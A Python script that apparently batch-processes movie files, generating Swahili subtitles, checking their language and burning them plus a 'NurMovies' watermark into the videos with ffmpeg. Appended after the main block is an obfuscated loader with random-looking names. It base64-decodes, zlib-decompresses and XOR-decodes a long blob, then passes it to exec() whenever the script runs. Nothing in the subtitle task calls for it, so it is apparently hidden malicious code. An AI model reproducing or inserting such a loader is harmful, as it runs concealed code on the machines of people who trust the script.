import os
print("[DEBUG] Script Started!")
import subprocess
import glob
import time
import sys

# FORCE UTF-8 for Terminal / Printing
if sys.stdout.encoding != 'UTF-8':
    try:
        import io
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)
    except:
        pass

# Configuration
SOURCE_FOLDER = r"C:\Users\CodeOba\Downloads\Video"
SUBTITLE_SCRIPT = r"C:\Users\CodeOba\.gemini\antigravity\scratch\swahilisub_ai.py"

def find_ffmpeg():
    """Robust discovery of ffmpeg.exe in common locations"""
    import shutil
    import glob
    
    # 0. Check KNOWN path (Fastest)
    known_path = r"C:\Users\CodeOba\AppData\Local\Microsoft\WinGet\Packages\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\ffmpeg-8.0.1-full_build\bin\ffmpeg.exe"
    print(f"[DEBUG] Checking known path: {known_path}")
    if os.path.exists(known_path):
        print("[DEBUG] Known path found!")
        return known_path
    print("[DEBUG] Known path NOT found!")

    # 1. Try system path first
    if shutil.which("ffmpeg"):
        return "ffmpeg"
    
    # 2. Check WinGet Packages (most likely location)
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    winget_path = os.path.join(local_app_data, "Microsoft", "WinGet", "Packages")
    if os.path.exists(winget_path):
        # Limit recursion depth or be specific if possible, but let's just leave it as fallback
        matches = glob.glob(os.path.join(winget_path, "**", "ffmpeg.exe"), recursive=True)
        if matches:
            return matches[0]
            
    return "ffmpeg"

# Add FFmpeg to PATH for Subprocesses (like Whisper)
FFMPEG_EXE = find_ffmpeg()
if FFMPEG_EXE and FFMPEG_EXE != "ffmpeg":
    ffmpeg_dir = os.path.dirname(FFMPEG_EXE)
    if ffmpeg_dir not in os.environ["PATH"]:
        os.environ["PATH"] += os.path.pathsep + ffmpeg_dir
        print(f"[*] Added FFmpeg to PATH: {ffmpeg_dir}")

def validate_swahili_subtitles(ass_path):
    """Validate that ASS file contains Swahili text, NOT English"""
    print(f"[*] Validating subtitle language: {os.path.basename(ass_path)}")
    
    # Common Swahili words that should appear in subtitles
    swahili_indicators = [
        'ni', 'na', 'kwa', 'ya', 'wa', 'nini', 'sawa', 'habari',
        'ndiyo', 'hapana', 'asante', 'tafadhali', 'samahani',
        'ninyi', 'sisi', 'wewe', 'yeye', 'wao', 'mimi'
    ]
    
    # Common English words that should NOT appear frequently
    english_indicators = [
        'the', 'and', 'you', 'are', 'what', 'have', 'this',
        'that', 'with', 'from', 'they', 'will', 'would'
    ]
    
    try:
        with open(ass_path, 'r', encoding='utf-8') as f:
            content = f.read().lower()
            
        # Count Swahili vs English indicators
        swahili_count = sum(content.count(word) for word in swahili_indicators)
        english_count = sum(content.count(word) for word in english_indicators)
        
        print(f"    - Swahili indicators: {swahili_count}")
        print(f"    - English indicators: {english_count}")
        
        # If English count is significantly higher, it's likely English
        if english_count > swahili_count * 2:
            print(f"[!] WARNING: Subtitle appears to be in ENGLISH!")
            print(f"[!] BLOCKING hardcoding to prevent English subtitles!")
            return False
        
        if swahili_count < 10:
            print(f"[!] WARNING: Very few Swahili words detected!")
            print(f"[!] BLOCKING hardcoding - subtitle quality check failed!")
            return False
            
        print(f"[+] Validation PASSED: Subtitles appear to be in Swahili ✓")
        return True
        
    except Exception as e:
        print(f"[!] Error validating subtitles: {e}")
        return False

def hardcode_subtitles(video_path, srt_path, output_path):
    ffmpeg = get_ffmpeg()
    print(f"[*] Hardcoding subtitles into: {output_path}")
    # Command to burn subtitles. Requires escaping path for the 'subtitles' filter
    # For Windows, we need to double the backslashes and escape the colon
    escaped_srt = srt_path.replace("\\", "/").replace(":", "\\:")
    # Cinema-Grade Styling: 
    # Fontname=Arial, FontSize=24, PrimaryColour=&H00FFFF00 (Yellow), OutlineColour=&H00000000 (Black)
    # BackColour=&H80000000 (Translucent Background - Optional, let's stick to outline for clean cinema look)
    # Bold=1, BorderStyle=1 (Outline), Outline=2, Shadow=1
    style = "Fontname=Arial,FontSize=24,PrimaryColour=&H0000FFFF,OutlineColour=&H00000000,Bold=1,BorderStyle=1,Outline=2,Shadow=1,Alignment=2,MarginV=20"
    
    cmd = [
        ffmpeg, "-y", "-i", video_path, 
        "-vf", f"subtitles='{escaped_srt}':force_style='{style}'", 
        "-c:a", "copy", output_path
    ]
    subprocess.run(cmd)

def main():
    movies = glob.glob(os.path.join(SOURCE_FOLDER, "*.ts")) + glob.glob(os.path.join(SOURCE_FOLDER, "*.mp4"))
    
    print(f"[*] Using FFmpeg: {FFMPEG_EXE}")

    for movie in movies:
        try:
            # Skip already processed (hardcoded) files
            if "_Swahili_Hardcoded" in movie:
                continue
                
            print(f"\n{'='*50}")
            print(f"[*] Processing: {os.path.basename(movie)}")
            
            # ... (rest of the logic remains the same, but wrapped in try)
            # 1. Generate Subtitles
            ass_path = os.path.splitext(movie)[0] + "_kiswahili.ass"
            
            if not os.path.exists(ass_path):
                print(f"[*] Transcribing/Translating (ASS Mode): {os.path.basename(movie)}")
                # PC GUARDIAN: Sleep if too fast to let CPU cool down
                time.sleep(2) 
                subprocess.run(["python", SUBTITLE_SCRIPT, movie], check=True) 
            
            # DOUBLE CHECK
            if os.path.exists(ass_path) and os.path.getsize(ass_path) > 1024:
                
                # CRITICAL: Validate subtitle language BEFORE hardcoding!
                if not validate_swahili_subtitles(ass_path):
                    print(f"[!] SKIPPING {os.path.basename(movie)} - Subtitles are NOT in Swahili!")
                    continue
                
                # THE INSPECTOR: Quality Control 🕵️‍♂️
                from inspector import inspect_and_polish
                inspect_and_polish(ass_path)
                
                output_video = os.path.splitext(movie)[0] + "_Swahili_Hardcoded.mp4"
                
                # SMART SKIP LOGIC 🧠
                if os.path.exists(output_video) and os.path.getsize(output_video) > 100000000:
                     print(f"[+] Video already completed: {os.path.basename(output_video)}. Skipping.")
                     continue
                
                # Hardcoding logic
                escaped_ass = ass_path.replace("\\", "/").replace(":", "\\:")
                
                # WATERMARK: "NurMovies"
                watermark_filter = (
                    f"drawtext=text='NurMovies':font='Arial':fontsize=36:"
                    f"fontcolor=gold:x=w-tw-20:y=h-th-20:"
                    f"shadowcolor=black:shadowx=2:shadowy=2:"
                    f"alpha='0.7+0.3*sin(t*2)'"
                )

                print(f"[*] Hardcoding with Cinema Styles & Watermark...")
                if os.path.exists(output_video): os.remove(output_video)
                
                cmd = [
                    FFMPEG_EXE, "-y", "-i", movie, 
                    "-vf", f"ass='{escaped_ass}',{watermark_filter}", 
                    "-c:a", "copy", output_video
                ]
                subprocess.run(cmd, check=True)
                print(f"[OK] Finished: {output_video}")
                
                # Cool down after hardcoding
                time.sleep(5)
                
            else:
                 print(f"[!] SKIP: Valid ASS file not found for {os.path.basename(movie)}")

        except Exception as e:
            print(f"[!!] CRITICAL ERROR processing {os.path.basename(movie)}: {e}")
            print("[*] Continuing to next movie...")
            continue

if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
